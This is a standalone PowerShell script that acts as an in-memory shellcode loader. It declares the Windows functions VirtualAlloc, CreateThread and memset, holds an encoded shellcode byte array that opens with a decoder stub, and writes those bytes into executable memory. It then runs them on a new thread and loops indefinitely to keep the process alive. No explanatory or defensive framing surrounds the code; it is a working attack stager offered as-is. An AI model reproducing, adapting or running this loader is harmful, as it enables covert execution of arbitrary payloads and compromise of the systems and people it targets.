$w6aN = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $w6aN -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0xba,0xe1,0xec,0x2d,0xe1,0x31,0x50,0x18,0x03,0x50,0x18,0x83,0xc0,0xe5,0x0e,0xd8,0x1d,0x0d,0x4c,0x23,0xde,0xcd,0x31,0xad,0x3b,0xfc,0x71,0xc9,0x48,0xae,0x41,0x99,0x1d,0x42,0x29,0xcf,0xb5,0xd1,0x5f,0xd8,0xba,0x52,0xd5,0x3e,0xf4,0x63,0x46,0x02,0x97,0xe7,0x95,0x57,0x77,0xd6,0x55,0xaa,0x76,0x1f,0x8b,0x47,0x2a,0xc8,0xc7,0xfa,0xdb,0x7d,0x9d,0xc6,0x50,0xcd,0x33,0x4f,0x84,0x85,0x32,0x7e,0x1b,0x9e,0x6c,0xa0,0x9d,0x73,0x05,0xe9,0x85,0x90,0x20,0xa3,0x3e,0x62,0xde,0x32,0x97,0xbb,0x1f,0x98,0xd6,0x74,0xd2,0xe0,0x1f,0xb2,0x0d,0x97,0x69,0xc1,0xb0,0xa0,0xad,0xb8,0x6e,0x24,0x36,0x1a,0xe4,0x9e,0x92,0x9b,0x29,0x78,0x50,0x97,0x86,0x0e,0x3e,0xbb,0x19,0xc2,0x34,0xc7,0x92,0xe5,0x9a,0x4e,0xe0,0xc1,0x3e,0x0b,0xb2,0x68,0x66,0xf1,0x15,0x94,0x78,0x5a,0xc9,0x30,0xf2,0x76,0x1e,0x49,0x59,0x1e,0xd3,0x60,0x62,0xde,0x7b,0xf2,0x11,0xec,0x24,0xa8,0xbd,0x5c,0xac,0x76,0x39,0xa3,0x87,0xcf,0xd5,0x5a,0x28,0x30,0xff,0x98,0x7c,0x60,0x97,0x09,0xfd,0xeb,0x67,0xb6,0x28,0x81,0x62,0x20,0x13,0xfe,0x80,0xd6,0xfb,0xfd,0x5a,0x07,0xa0,0x88,0xbd,0x77,0x08,0xdb,0x11,0x37,0xf8,0x9b,0xc1,0xdf,0x12,0x14,0x3d,0xff,0x1c,0xfe,0x56,0x95,0xf2,0x57,0x0e,0x01,0x6a,0xf2,0xc4,0xb0,0x73,0x28,0xa1,0xf2,0xf8,0xdf,0x55,0xbc,0x08,0x95,0x45,0x28,0xf9,0xe0,0x34,0xfe,0x06,0xdf,0x53,0xfe,0x92,0xe4,0xf5,0xa9,0x0a,0xe7,0x20,0x9d,0x94,0x18,0x07,0x96,0x1d,0x8d,0xe8,0xc0,0x61,0x41,0xe9,0x10,0x34,0x0b,0xe9,0x78,0xe0,0x6f,0xba,0x9d,0xef,0xa5,0xae,0x0e,0x7a,0x46,0x87,0xe3,0x2d,0x2e,0x25,0xda,0x1a,0xf1,0xd6,0x09,0x9b,0xcd,0x00,0x77,0xe9,0x3f,0x91;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rbp=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rbp.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rbp,0,0,0);for (;;){Start-sleep 60};